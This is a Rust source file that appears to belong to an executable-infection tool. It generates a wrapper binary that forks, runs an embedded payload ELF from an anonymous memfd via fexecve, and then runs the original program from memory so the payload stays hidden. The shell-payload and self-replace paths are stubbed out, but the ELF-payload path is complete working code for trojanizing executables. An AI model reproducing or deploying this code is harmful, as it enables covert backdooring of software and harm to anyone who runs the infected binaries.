use crate::codegen::{self, rust};
use crate::errors::*;
use crate::infect::elf::{Infect, Payload};
use std::path::Path;

pub async fn add_payload(compiler: &mut rust::Compiler, payload: &Payload<'_>) -> Result<()> {
    compiler.add_lines(&["unsafe { setsid() };\n"]).await?;

    match payload {
        Payload::Shell(payload) => {
            let mut buf = String::new();
            codegen::escape(payload.as_bytes(), &mut buf)?;

            /*
            compiler
                .add_lines(&[
                    &format!("char *args[]={{\"/bin/sh\", \"-c\", \"{}\", NULL}};\n", buf),
                    "execve(\"/bin/sh\", args, environ);\n",
                ])
                .await?;
            */

            // TODO
            bail!("Embedding a shell payload is not yet supported for the rust backend");
        }
        Payload::Elf(payload) => {
            compiler
                .add_lines(&[
                    "let name = CStr::from_bytes_with_nul(b\"\\x00\").unwrap();\n",
                    "let f = unsafe { memfd_create(name.as_ptr(), MFD_CLOEXEC) };\n",
                    "if f == -1 { exit(1) }\n",
                    "let mut f = unsafe { File::from_raw_fd(f) };\n",
                ])
                .await?;

            rust::stream_bin_std(payload, &mut compiler.stdin).await?;
            compiler
                .add_lines(&["unsafe { fexecve(f.as_raw_fd(), argv.as_ptr(), environ) };\n"])
                .await?;
        }
    }

    compiler
        .add_lines(&[
            // "unsafe { perror(CStr::from_bytes_with_nul(b\"exec\\x00\").unwrap().as_ptr()) };\n",
            "exit(1);\n",
        ])
        .await?;

    Ok(())
}

pub async fn infect(
    bin: &Path,
    config: &Infect,
    orig: &[u8],
    payload: Option<&Payload<'_>>,
) -> Result<()> {
    let mut compiler = rust::Compiler::spawn(bin, config.target.as_deref()).await?;

    info!("Generating source code...");
    compiler
        .add_lines(&[
            "#![allow(non_camel_case_types)]\n",
            "use std::env;\n",
            "use std::ffi::{CStr, CString, c_int, c_uint, c_char};\n",
            "use std::fs::File;\n",
            "use std::io::Write;\n",
            "use std::iter::once;\n",
            "use std::os::fd::{AsRawFd, FromRawFd};\n",
            "use std::os::unix::ffi::OsStrExt;\n",
            "use std::process::exit;\n",
            "use std::ptr;\n",
            "pub type pid_t = i32;\n",
            "const MFD_CLOEXEC: c_uint = 1;\n",
            "extern \"C\" {\n",
            "fn memfd_create(name: *const c_char, flags: c_uint) -> c_int;\n",
            "fn fork() -> pid_t;\n",
            "fn setsid() -> pid_t;\n",
            "fn fexecve(fd: c_int, argv: *const *const c_char, envp: *const *const c_char) -> c_int;\n",
            // "fn perror(s: *const c_char);\n",
            "static environ: *const *const c_char;\n",
            "}\n",
            "fn main() {\n",
            "let argv = env::args_os()
                .map(|s| CString::new(s.as_bytes()).unwrap())
                .collect::<Vec<_>>();\n",
            "let argv = argv.iter()
                .map(|s| s.as_ptr())
                .chain(once(ptr::null()))
                .collect::<Vec<_>>();\n",
        ])
        .await?;

    if let Some(payload) = &payload {
        compiler
            .add_lines(&["let c = unsafe { fork() };\n", "if c == 0 {\n"])
            .await?;
        add_payload(&mut compiler, payload).await?;
        compiler.add_line("}\n").await?;
    }

    if config.self_replace {
        bail!("The self-replace feature is currently not available with this compiler backend");
    }

    compiler
        .add_lines(&[
            "let name = CStr::from_bytes_with_nul(b\"\\x00\").unwrap();\n",
            "let f = unsafe { memfd_create(name.as_ptr(), MFD_CLOEXEC) };\n",
            "if f == -1 { exit(1) }\n",
            "let mut f = unsafe { File::from_raw_fd(f) };\n",
        ])
        .await?;

    rust::stream_bin_std(orig, &mut compiler.stdin).await?;

    compiler
        .add_lines(&[
            "unsafe { fexecve(f.as_raw_fd(), argv.as_ptr(), environ) };\n",
            "}\n",
        ])
        .await?;

    let mut pending = compiler.done();
    info!("Waiting for compile to finish...");
    pending.wait().await?;

    Ok(())
}
